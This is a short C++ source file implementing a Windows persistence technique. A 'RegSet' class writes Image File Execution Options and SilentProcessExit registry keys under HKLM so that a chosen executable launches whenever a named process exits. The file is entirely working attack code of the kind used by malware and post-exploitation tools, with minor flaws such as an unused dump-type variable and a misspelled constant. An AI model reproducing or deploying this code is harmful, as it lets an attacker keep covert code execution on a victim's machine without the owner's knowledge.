#include "ExitProcess.h"

RegSet::RegSet(std::string processName, std::string sourceName) {
	this->bIsValid = FALSE;
	std::string subkeyIFEO = IFEO_REG_KEY + processName;

	LSTATUS ret = RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeyIFEO.c_str(), &this->hIFEORegKey);
	if (ret != ERROR_SUCCESS) return;

	DWORD SilentExitFlag = FLG_MONITOR_SILENT_PROCESS_EXIT;
	ret = RegSetValueExA(this->hIFEORegKey, "GlobalFlag", 0, REG_DWORD, (const BYTE*)&SilentExitFlag, sizeof(DWORD));

	if (ret != ERROR_SUCCESS) {
		RegCloseKey(this->hIFEORegKey);
		return;
	}

	std::string subkeySPE = SILENT_PROCESS_EXIT_REG_KEY + processName;
	ret = RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeySPE.c_str(), &this->hSPERegKey);

	if (ret != ERROR_SUCCESS) {
		RegCloseKey(this->hSPERegKey);
		return;
	}

	DWORD ReportingMode = MinitorProcess;
	std::string MonitorProcessPath = sourceName;
	DWORD DumpType = LOCAL_DUMP;


	ret = RegSetValueExA(this->hSPERegKey, "ReportingMode", 0, REG_DWORD, (const BYTE*)&ReportingMode, sizeof(DWORD));
	ret = RegSetValueExA(this->hSPERegKey, "MonitorProcess", 0, REG_SZ, (const BYTE*)MonitorProcessPath.c_str(), MonitorProcessPath.size() + 1);

	if (ret != ERROR_SUCCESS) {
		RegCloseKey(this->hIFEORegKey);
		RegCloseKey(this->hSPERegKey);
		return;
	}

	this->bIsValid = TRUE;

}

RegSet::~RegSet() {
}

BOOL RegSet::isValid() {
	return this->bIsValid;
}